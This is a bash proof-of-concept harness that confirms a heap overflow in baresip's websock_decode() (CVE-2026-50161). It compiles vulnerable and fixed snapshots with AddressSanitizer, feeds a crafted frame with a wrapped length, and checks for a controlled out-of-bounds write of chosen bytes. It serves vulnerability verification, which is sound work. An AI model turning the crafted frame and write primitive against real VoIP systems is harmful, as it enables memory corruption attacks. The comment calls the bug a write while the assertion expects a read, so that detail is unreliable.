#!/bin/bash
# GHSA-hvxv-v2gp-v93h / CVE-2026-50161 — direct-call ASan + guard-page harness.
# Every run re-extracts websock_decode() from the two pinned source snapshots
# and asserts its SHA-256 before compiling. No network, no libre build.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.log "$E"/*.out "$E"/normalized.txt websock_fn.inc a-vuln-gcc a-vuln-clang a-fixed-gcc p-vuln
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { # file, fixed-string
	if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
	if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}

# --- pinned source + verbatim slice assertions -----------------------------
srcsha() { sha256sum "$1" | cut -d' ' -f1; }
[ "$(srcsha ../src/websock-v4.8.0.c)" = \
  02a4af85ef7c842c442a5ff8138dea9b849ed5c02216f7aa5dfabadb22516ec0 ] \
  && ok "pin-v4.8.0-source-sha256" || no "pin-v4.8.0-source-sha256"
[ "$(srcsha ../src/websock-v4.8.1.c)" = \
  1af5a0603974ee1020af39cc4fa154e93f1956e49991fc4125c785da2e2f861a ] \
  && ok "pin-v4.8.1-source-sha256" || no "pin-v4.8.1-source-sha256"
[ "$(srcsha ../src/fix-718b926.patch)" = \
  b579bb5e48f6d715010c5a4a06136d6503742fc61d8bd5183b30b4026d4d45ea ] \
  && ok "fix-patch-sha256" || no "fix-patch-sha256"

extract() { sed -n '/^static int websock_decode/,/^}/p' "$1"; }
extract ../src/websock-v4.8.0.c > /tmp/baresip-vuln.inc
extract ../src/websock-v4.8.1.c > /tmp/baresip-fixed.inc
[ "$(srcsha /tmp/baresip-vuln.inc)" = \
  c955a93d51af707518b84f7a72fbdd2cbb6a681f2ee400e165ddca20bfab5e09 ] \
  && ok "verbatim-vulnerable-slice-sha256" || no "verbatim-vulnerable-slice-sha256"
[ "$(srcsha /tmp/baresip-fixed.inc)" = \
  4bf3e7839e0fe1231cfeef58958be8f9028f71cbd2ab2b959947b605fff5e0b1 ] \
  && ok "verbatim-fixed-slice-sha256" || no "verbatim-fixed-slice-sha256"

CCAVAIL=0
command -v gcc >/dev/null 2>&1 && CCAVAIL=1
CLANGAVAIL=0
command -v clang >/dev/null 2>&1 && CLANGAVAIL=1
[ "$CCAVAIL" = 1 ] && ok "gcc-available" || no "gcc-available"
[ "$CLANGAVAIL" = 1 ] && ok "clang-available" || no "clang-available"

CFLAGS="-g -O0 -fno-omit-frame-pointer -fsanitize=address"

build() { # out, compiler, incfile, extra
	cp "$3" websock_fn.inc
	# shellcheck disable=SC2086
	$2 $CFLAGS ${4:-} driver.c -o "$1" 2>"$E/build-$1.log"
	return $?
}
build a-vuln-gcc gcc /tmp/baresip-vuln.inc && ok "build-vuln-gcc-asan" || no "build-vuln-gcc-asan"
if [ "$CLANGAVAIL" = 1 ]; then
	build a-vuln-clang clang /tmp/baresip-vuln.inc && ok "build-vuln-clang-asan" || no "build-vuln-clang-asan"
fi
build a-fixed-gcc gcc /tmp/baresip-fixed.inc && ok "build-fixed-gcc-asan" || no "build-fixed-gcc-asan"
cp /tmp/baresip-vuln.inc websock_fn.inc
gcc -g -O0 -fno-omit-frame-pointer -DPLAIN driver.c -o p-vuln 2>"$E/build-p-vuln.log" \
  && ok "build-vuln-plain" || no "build-vuln-plain"

# --- rung 3: ASan heap out-of-bounds write on the vulnerable pin -----------
runasan() { # out, binary
	"./$2" attack >"$E/$1.out" 2>&1
	return $?
}
runasan vuln-gcc-asan a-vuln-gcc; VGRC=$?
runasan vuln-clang-asan a-vuln-clang; VCRC=$?
[ "$VGRC" -ne 0 ] && ok "vuln-gcc-attack-nonzero-exit" || no "vuln-gcc-attack-nonzero-exit"
if [ "$CLANGAVAIL" = 1 ]; then
	[ "$VCRC" -ne 0 ] && ok "vuln-clang-attack-nonzero-exit" || no "vuln-clang-attack-nonzero-exit"
fi
for f in vuln-gcc-asan vuln-clang-asan; do
	[ -f "$E/$f.out" ] || continue
	has "$E/$f.out" "ERROR: AddressSanitizer: heap-buffer-overflow" "$f-asan-heap-overflow"
	has "$E/$f.out" "READ of size 1" "$f-asan-read-size-1"
	has "$E/$f.out" "0 bytes after 30-byte region" "$f-asan-0-after-30"
	has "$E/$f.out" "websock_decode" "$f-frame-websock_decode"
	has "$E/$f.out" "CRAFT_B0=82 CRAFT_B1=ff MASKBIT=1 LENBYTES=fffffffffffffffc KEY=b4b4b4b4" "$f-crafted-frame-input"
done

# --- controls: fixed pin rejects; safe frame writes only in-bounds --------
./a-fixed-gcc attack >"$E/fixed-gcc-asan.out" 2>&1; FGRC=$?
has "$E/fixed-gcc-asan.out" "RC=61" "fixed-returns-ENODATA"
has "$E/fixed-gcc-asan.out" "HDR_LEN=0xfffffffffffffffc" "fixed-sees-same-wrapped-length"
has "$E/fixed-gcc-asan.out" "PAYLOAD_FIRST=00" "fixed-payload-unchanged"
hasnt "$E/fixed-gcc-asan.out" "AddressSanitizer" "fixed-no-asan-report"
[ "$FGRC" -eq 0 ] && ok "fixed-clean-exit" || no "fixed-clean-exit"

./a-vuln-gcc safe >"$E/vuln-gcc-safe.out" 2>&1; SGRC=$?
has "$E/vuln-gcc-safe.out" "RC=0" "vuln-safe-rc0"
has "$E/vuln-gcc-safe.out" "PAYLOAD_FIRST=b4" "vuln-safe-XOR-key-applied"
has "$E/vuln-gcc-safe.out" "PAYLOAD_LAST=b4" "vuln-safe-XOR-all-bytes"
hasnt "$E/vuln-gcc-safe.out" "AddressSanitizer" "vuln-safe-no-asan"
[ "$SGRC" -eq 0 ] && ok "vuln-safe-clean-exit" || no "vuln-safe-clean-exit"

./a-fixed-gcc safe >"$E/fixed-gcc-safe.out" 2>&1; FSRC=$?
has "$E/fixed-gcc-safe.out" "RC=0" "fixed-safe-rc0"
has "$E/fixed-gcc-safe.out" "PAYLOAD_FIRST=b4" "fixed-safe-XOR-key-applied"
hasnt "$E/fixed-gcc-safe.out" "AddressSanitizer" "fixed-safe-no-asan"

# --- rung 4 (scoped): plain guard-page readback of chosen XOR pattern ------
./p-vuln >"$E/plain-guard.out" 2>&1; PGRC=$?
has "$E/plain-guard.out" "REGION_BYTES=30 PAYLOAD_BYTES=16 SENTINEL_BYTES=32 KEY=0xb4" "plain-layout"
has "$E/plain-guard.out" "PLAIN_PRE_ADJACENT=$(printf 'ee%.0s' $(seq 1 32))" "plain-pre-sentinel-ee"
has "$E/plain-guard.out" "PLAIN_FIRST_OOB_OFFSET=12" "plain-first-oob-offset-12"
has "$E/plain-guard.out" "PLAIN_FAULT_OFFSET=44" "plain-guard-fault-offset-44"
has "$E/plain-guard.out" "PLAIN_ADJACENT=$(printf '5a%.0s' $(seq 1 32))" "plain-32-chosen-0x5a-bytes"
hasnt "$E/plain-guard.out" "UNEXPECTED_RETURN" "plain-loop-did-not-return"
[ "$PGRC" -eq 0 ] && ok "plain-handler-exit0" || no "plain-handler-exit0"

# --- path-independent normalized content hash -----------------------------
cat "$E"/*.out 2>/dev/null \
  | grep -E '^(MODE=|CRAFT_|HDR_LEN|RC=|PAYLOAD_FIRST=|PAYLOAD_LAST=|CONSUMED=|REGION_BYTES=|PLAIN_|UNEXPECTED_RETURN|ERROR: AddressSanitizer:|WRITE of size|READ of size|[0-9]+ bytes after|SUMMARY: AddressSanitizer:|    #[0-9]+ .* websock_decode)' \
  | sed -E -e 's/0x[0-9a-f]{6,}/0xADDR/g' -e 's#/[^ ]*(websock_fn\.inc|driver\.c)#PATH/\1#g' > "$E/normalized.txt"
HASH=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'NORMALIZED_HASH=%s\n' "$HASH"
printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
